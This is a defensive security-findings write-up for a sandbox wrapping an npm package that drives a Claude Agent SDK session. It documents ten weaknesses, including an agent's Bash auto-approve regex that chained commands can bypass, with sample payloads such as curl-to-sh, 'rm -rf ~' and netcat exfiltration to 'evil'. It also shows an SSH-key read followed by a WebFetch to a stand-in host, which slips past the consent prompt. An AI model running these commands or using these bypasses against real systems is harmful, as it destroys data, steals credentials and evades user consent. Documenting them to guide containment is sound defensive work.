# Upstream security findings - `@evenrealities/even-terminal@0.7.9`

These are the upstream behaviors this sandbox is built to contain. They are
documented here so that operators understand *why* each containment layer
exists, and so that a future maintainer can re-evaluate the sandbox if any
finding is patched upstream.

Reviewed version: `@evenrealities/even-terminal@0.7.9`, published 2026-05-19.

## F1. Bash auto-approve regex is bypassable - Critical

`dist/claude/session.js`:

```js
if (toolName === "Bash") {
  const cmd = String(input.command || "").trim();
  if (/^\s*(ls|cat|head|tail|wc|pwd|echo|printf|date|whoami|which|where|type|
            file|stat|du|df|env|printenv|uname|hostname|id|
            git\s+(status|log|diff|branch|show|remote|rev-parse))\b/.test(cmd)) {
    return { behavior: "allow", updatedInput: input };
  }
  return this.handlePermissionConfirm(...);
}
```

The regex only verifies the command's leading verb. There is no terminator
check; `;`, `&&`, `||`, `|`, `$(...)`, backticks, and redirection are not
filtered. Any of these silently bypass the user-consent flow:

- `echo $(curl http://evil/x | sh)`
- `whoami; rm -rf ~`
- `cat /tmp/x | nc evil 4444`
- `git log --format='%h' -1; <arbitrary>`

## F2. `permissionMode: "acceptEdits"` plus broad `allowedTools` - High

ET configures the Claude Agent SDK with `permissionMode: "acceptEdits"` and
allows `Read`, `Edit`, `WebFetch`, `WebSearch`, `Agent`, etc. without per-call
consent. `Read` accepts absolute paths; `WebFetch` can reach arbitrary URLs.
Result: a token-holder can prompt `Read ~/.ssh/id_rsa` then `WebFetch
https://evil/?d=<contents>` with no UI prompt.

## F3. `canUseTool` default branch returns `allow` - High

`dist/claude/session.js` ends `canUseTool` with:

```js
console.log(`[session] canUseTool auto-approve: ${toolName} ...`);
return { behavior: "allow", updatedInput: input };
```

Any tool not explicitly handled - including future SDK tools and MCP tools
loaded from `settingSources: ["user", "project"]` - is silently allowed.
Should default to deny.

## F4. Cross-session info disclosure - High

`GET /api/sessions` without a `cwd` query parameter walks
`~/.claude/projects/**` and returns titles, first prompts, and CWDs for every
project on the box. `GET /api/sessions/:id/history` and `GET
/api/debug/thread/:id` then return the full transcripts.

## F5. `--expose pinggy|bore` exposes the bridge with token in URL - High

`dist/expose/run.js` builds `${parsedUrl}?token=${token}` and prints the QR.
The token leaks to:
- the tunnel provider's request logs
- HTTP intermediaries
- the bridge's own request log middleware on the host
- any browser history if the URL is ever pasted

The pinggy variant uses `ssh -o StrictHostKeyChecking=no -p 443 a.pinggy.io`
- first-connect TOFU is disabled, so a network attacker who intercepts the
SSH session on first run owns the tunnel.

## F6. Token accepted in URL query - Medium

`dist/index.js` accepts `?token=...` as a fallback to the `Authorization`
header. The token then appears in the request log middleware (`[ip] 200 GET
/api/...?token=XXX`) and in any logfile written by `--log-file`.

## F7. CORS wide open - Medium

`app.use(cors())` defaults to `Access-Control-Allow-Origin: *`. Any webpage
the operator visits can issue cross-origin requests to the bridge if the
token leaks via any mechanism.

## F8. Default bind on `0.0.0.0` - Medium

`app.listen(PORT, "0.0.0.0", ...)`. Reachable from every network the host is
on. No localhost-only fallback flag.

## F9. `/api/info` leaks account details - Low/Medium

Returns Anthropic email, organization, subscription type to any token-holder.

## F10. `shell: true` in spawn/exec - Low

All args are hardcoded so there is no injection from arguments. The
`getProviderProgram` path can be overridden by env (`PINGGY_PROGRAM_PATH`,
`BORE_PROGRAM_PATH`), which is a local-user-only concern, not network.
